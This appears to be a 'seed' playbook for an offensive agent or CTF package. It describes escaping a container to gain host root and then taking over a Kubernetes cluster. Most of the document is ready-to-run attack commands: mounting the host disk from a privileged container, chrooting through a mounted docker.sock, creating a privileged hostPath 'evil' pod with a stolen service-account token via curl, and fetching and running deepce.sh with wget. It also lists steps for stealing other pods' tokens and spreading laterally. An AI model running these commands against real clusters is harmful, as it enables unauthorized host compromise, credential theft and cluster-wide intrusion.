# [Seed] Container escape → obtain host root (cap_sys_admin / privileged container / docker.sock)

## Scene classification
Penetration Testing/Cloud Native/Container Security

## Goal overview
Obtain a shell in a container (through an application vulnerability, exposed Jenkins, or RCE on Kubernetes), escape to the host, then move laterally across the cluster.

## Complete workflow

1. Perform initial reconnaissance immediately after entering the container
   ```bash
   id                                    # Is this root?
   cat /proc/self/status | grep CapEff   # Inspect capabilities
   capsh --print                         # Same as above, with more readable output
   ls -la /var/run/docker.sock           # Is the Docker socket mounted?
   mount | grep -v proc                  # See which host directories are mounted
   cat /proc/1/cgroup                    # Is this docker, containerd, or kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # Service account / metadata token
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Select the escape path according to the detection results:

   **Path A: Privileged Container (`--privileged`)**
   ```bash
   # Directly mount the host disk
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # Now you are the host root
   ```

   **Path B: cap_sys_admin/cap_dac_read_search**
   ```bash
   # Bypass using release_agent (CVE-2022-0492 class)
   # Use cap_sys_admin to mount directly
   ```

   **Path C: docker.sock hung**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: K8s SA token has permission**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # If you can create pod → use hostPID/hostNetwork/hostPath to enable privileged pod escape
   ```

   **Path E: kernel exploit (Dirty Pipe/Dirty COW/OverlayFS)**
   ```bash
   uname -a               # Check the kernel version
   # Select a ready-made exploit corresponding to the CVE
   ```

3. After escaping, find the next jump on the host machine
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - Tokens of other pods
   - hostNetwork → Directly connect to all service IPs in the cluster
4. Spread laterally to the entire K8s

## Lessons learned

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| Container is non-root and all capabilities are empty | Application is well hardened | Look for setuid binaries, kernel vulnerabilities, or other container escape vectors | Several hours |
| Can see docker.sock but cannot read it | Socket is root:root 660 | Add the current user to the docker group (if a setgid program is available) or use another container | 30 min |
| Privileged pod started but image download failed | Internal cluster uses an internal Docker registry | Use an image already present in the cluster (for example, one under kube-system) | 20 min |
| K8s service-account token has no permissions | Default service accounts are usually default/restricted | List pods → find a pod with cluster-admin → obtain its service-account token | 1 hour |
| No common tools after chroot | Host is a minimal distribution | Mount /proc, /dev, and /sys before chroot, or operate directly in the original namespace at /host | 30 min |
| Cluster uses PodSecurity Standards | Restricted policy blocks hostPath / privileged | Check whether the namespace has permissive admission settings; find a service account allowed to create deployments | Several hours |

## Toolchain discovery

- **deepce** Container escape automated detection (an sh script, no dependencies)
- **kdigger** Kubernetes/container reconnaissance tool that outputs structured results
- **peirates** K8s penetration-specific TUI
- **kube-hunter** Produced by Aqua, scans cluster security issues
- **botb (break out the box)** Old container escape tool
- **cdk** Container Penetration Swiss Army Knife (Chinese project, covering Chinese cloud vendor scenarios)

## Key code/command

One-click self-test:

```bash
# Pull deepce (does not depend on anything)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: N escape paths detected
```

Use K8s SA token to enable privileged pod escape:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If you can create pod, use hostPath to hang the host
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Then exec into evil pod and chroot /host
```

CVE-2022-0492 exploit (cap_sys_admin + without user namespace):

```bash
# See https://github.com/PaloAltoNetworks/cve-2022-0492
# Core: mount cgroup → write release_agent → trigger empty cgroup → execute in host context
```

## Suggestions for improvements to this package

- There is already`CTF-Sandbox-Orchestrator/competition-agent-cloud/`, it is recommended to add`references/k8s-attack-paths.md`
- attack-chain adds "container escape → cluster takeover" full path example
- bootstrap-manifest added deepce/kdigger/peirates

## Reusable patterns/script snippets

**Container escape 5 path quick check**:

```text
1. Privileged container → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin     → CVE-2022-0492 (release_agent) / mount a cgroup yourself
3. docker.sock       → docker run -v /:/host alpine chroot /host
4. K8s SA + permissions → from hostPath/privileged pod
5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must read after escaping**:

```text
- /var/lib/kubelet/pods/ → Steal SA tokens of other pods
- /var/lib/docker/ → see the list of running containers
- ip addr → use hostNetwork to directly access service IP
- crictl ps → containerd container list
- ps -ef --forest → Find kubelet / dockerd startup parameters (including token)
```

## evolution action
- [ ] CTF-Sandbox-Orchestrator/competition-agent-cloud Add k8s-attack-paths.md
- [ ] attack-chain adds container escape → cluster takeover path
- [ ] bootstrap-manifest adds deepce/kdigger/peirates

## environmental information
- Attack location: Inside the container (any shell entry is acceptable)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: Depending on the target, focus on CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 window

## redaction requirements
This article is seed data, written based on public container/K8s security research, and does not involve any real clusters.
